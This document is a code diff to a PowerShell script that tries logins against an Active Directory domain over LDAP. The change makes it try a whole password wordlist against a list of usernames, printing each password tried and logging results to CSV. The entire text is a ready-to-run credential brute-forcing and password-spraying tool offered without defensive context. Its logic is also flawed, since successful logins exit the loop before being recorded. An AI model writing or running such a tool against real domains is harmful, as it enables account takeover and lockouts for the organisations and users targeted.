@@ -1,40 +1,46 @@
 param (
-    [Parameter(Mandatory=$true, HelpMessage="Path to the usernames list file", Position=0)]
-    [string]$ul,
+    [Parameter(Mandatory=$true)]
+    [string]$UserListPath,
 
-    [Parameter(Mandatory=$true, HelpMessage="Password to be tested", Position=1)]
-    [string]$p,
+    [Parameter(Mandatory=$true)]
+    [string]$PasswordListPath,
 
-    [Parameter(Mandatory=$true, HelpMessage="Path to the output CSV file", Position=2)]
-    [string]$o
+    [Parameter(Mandatory=$true)]
+    [string]$OutputFilePath
 )
 
-$userList = Get-Content -Path $ul
+$userList = Get-Content -Path $UserListPath
+$passwordList = Get-Content -Path $PasswordListPath
 $results = @()
 
 foreach ($user in $userList) {
-    $pass = ConvertTo-SecureString $p -AsPlainText -Force
-    $plaintext = (New-Object System.Management.Automation.PSCredential 'N/A',$pass).GetNetworkCredential().Password
-    $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-    $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$plaintext)
+    foreach ($password in $passwordList) {
+        $pass = ConvertTo-SecureString $password -AsPlainText -Force
+        $plaintext = (New-Object System.Management.Automation.PSCredential 'N/A',$pass).GetNetworkCredential().Password
+        $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+        $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$plaintext)
 
-    Write-Host "Checking credentials for $user..." -ForegroundColor Cyan
-    
-    if ($domain.name -eq $null){
-        $output = "Fail"
-        $message = "[-] Failed to authenticate $user with domain $CurrentDomain"
-        Write-Host $message -ForegroundColor Red
-    }
-    else {
-        $output = "Success"
-        $message = "[*] Successfully authenticated $user with domain $CurrentDomain"
-        Write-Host $message -ForegroundColor Green
-    }
-    
-    $results += [PSCustomObject]@{
-        Username = $user
-        Status = $output
+        Write-Host "Checking credentials for $user with password: $password..." -ForegroundColor Cyan
+
+        if ($domain.name -eq $null){
+            $output = "Fail"
+            $message = "[-] Failed to authenticate $user using password:$password"
+            Write-Host $message -ForegroundColor Red
+        }
+        else {
+            $output = "Success"
+            $message = "[*] Successfully authenticated user:$user with domain $CurrentDomain using password:$password"
+            Write-Host $message -ForegroundColor Green
+            # If authenticated, no need to continue with other passwords
+            break
+        }
+
+        $results += [PSCustomObject]@{
+            Username = $user
+            Password = $password
+            Status = $output
+        }
     }
 }
 
-$results | Export-Csv -Path $o -NoTypeInformation
+$results | Export-Csv -Path $OutputFilePath -NoTypeInformation
